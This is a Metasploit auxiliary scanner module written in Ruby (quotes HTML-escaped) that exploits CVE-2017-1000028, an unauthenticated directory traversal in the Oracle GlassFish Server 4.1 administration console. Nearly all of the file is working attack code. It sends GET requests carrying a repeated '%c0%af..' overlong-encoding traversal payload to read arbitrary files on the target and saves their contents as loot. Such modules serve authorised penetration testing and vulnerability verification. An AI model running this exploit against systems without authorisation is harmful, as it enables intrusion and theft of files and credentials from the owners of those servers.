# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Path Traversal in Oracle GlassFish Server Open Source Edition&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        which exits in administration console of Oracle GlassFish Server 4.1, which is
        listening by default on port 4848/TCP.
      },
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2017-1000028&#039;],
          [&#039;URL&#039;, &#039;https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904&#039;],
          [&#039;EDB&#039;, &#039;39441&#039;]
        ],
      &#039;Author&#039;      =>
        [
          &#039;Trustwave SpiderLabs&#039;, # Vulnerability discovery
          &#039;Dhiraj Mishra&#039; # Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 08 2015&#039;,
      &#039;License&#039;     => MSF_LICENSE
    ))
 
    register_options(
      [
        Opt::RPORT(4848),
        OptString.new(&#039;FILEPATH&#039;, [true, "The path to the file to read", &#039;/windows/win.ini&#039;]),
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Depth for Path Traversal&#039;, 13 ])
      ])
  end
 
  def run_host(ip)
    filename = datastore[&#039;FILEPATH&#039;]
    traversal = "%c0%af.." * datastore[&#039;DEPTH&#039;] << filename
 
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/theme/META-INF/prototype#{traversal}"
    })
 
    unless res && res.code == 200
      print_error(&#039;Nothing was downloaded&#039;)
      return
    end
 
    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      &#039;oracle.traversal&#039;,
      &#039;text/plain&#039;,
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end

